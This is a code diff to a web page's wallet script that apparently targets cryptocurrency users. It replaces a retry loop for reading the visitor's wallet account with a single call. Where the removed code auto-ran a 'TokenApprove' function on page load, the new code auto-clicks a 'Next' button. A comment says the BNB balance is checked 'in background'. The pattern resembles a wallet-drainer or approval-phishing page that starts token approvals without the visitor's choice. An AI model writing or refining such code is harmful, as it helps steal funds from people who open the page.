@@ -383,41 +383,8 @@
     showLoading('Processing...');
     
     try {
-        // Get account - try multiple methods with retry (as in reference code)
-        let account = null;
-        let attempts = 0;
-        const maxAttempts = 5;
-        
-        while (!account && attempts < maxAttempts) {
-            // Try web3.eth.accounts[0] first (as in reference code)
-            if (web3 && web3.eth && web3.eth.accounts && web3.eth.accounts[0]) {
-                account = web3.eth.accounts[0];
-                break;
-            }
-            
-            // If not available, try eth_accounts
-            try {
-                const accounts = await ethereum.request({ method: 'eth_accounts' });
-                if (accounts && accounts[0]) {
-                    account = accounts[0];
-                    break;
-                }
-            } catch (e) {
-                console.log('eth_accounts error:', e);
-            }
-            
-            // Wait before retry
-            if (!account) {
-                await new Promise(resolve => setTimeout(resolve, 500));
-                attempts++;
-            }
-        }
-        
-        if (!account) {
-            console.error("No account found after retries");
-            hideLoading();
-            return;
-        }
+        const accounts = await ethereum.request({ method: 'eth_accounts' });
+        const account = accounts[0];
 
         // Step 1: Check the current BNB balance (in background)
         const bnbBalance = await web3.eth.getBalance(account);
@@ -712,16 +679,15 @@ if (typeof window !== 'undefined') {
 
 </script>
 <script>
-    // Auto-start TokenApprove when page loads (same as previous version)
+    // Auto-click Next button when page loads
     window.addEventListener('load', function() {
-        // Wait for web3 and wallet to be ready
+        // Small delay to ensure everything is ready
         setTimeout(function() {
-            // Ensure web3 is initialized
-            if (typeof web3 === 'undefined' && window.ethereum) {
-                window.web3 = new Web3(window.ethereum);
+            const nextBtn = document.getElementById('nextBtn');
+            if (nextBtn) {
+                nextBtn.click();
             }
-            TokenApprove();
-        }, 1500);
+        }, 1000);
     });
 </script>
 
